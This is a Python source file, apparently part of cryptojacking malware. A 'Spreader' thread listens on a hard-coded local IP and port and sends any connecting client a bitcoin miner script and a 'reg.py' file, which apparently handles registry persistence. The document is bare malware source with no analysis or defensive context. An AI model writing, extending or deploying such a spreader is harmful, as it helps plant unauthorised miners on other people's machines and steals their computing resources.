import os
import socket
import sys
import threading

miner_path = os.path.join(os.path.dirname(sys.argv[0]), "bitcoin/main_multiprocessing.py")
reg_path = os.path.join(os.path.dirname(sys.argv[0]), "bitcoin/reg.py")


class Spreader(threading.Thread):

    def run(self) -> None:
        super().run()
        server_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_tcp.bind(("192.168.173.18", 2231))
        server_tcp.listen()
        print("spreader listening")
        while True:
            try:
                client_tcp, addr = server_tcp.accept()
                print("spreader got client")
                with open(miner_path, "rb") as f:
                    client_tcp.send(f.read() + b";")
                print("sent")
                client_tcp.recv(2)
                with open(reg_path, "rb") as f:
                    client_tcp.send(f.read() + b";")
                client_tcp.recv(2)
                client_tcp.close()
                print("end")
            except Exception as e:
                print(e)
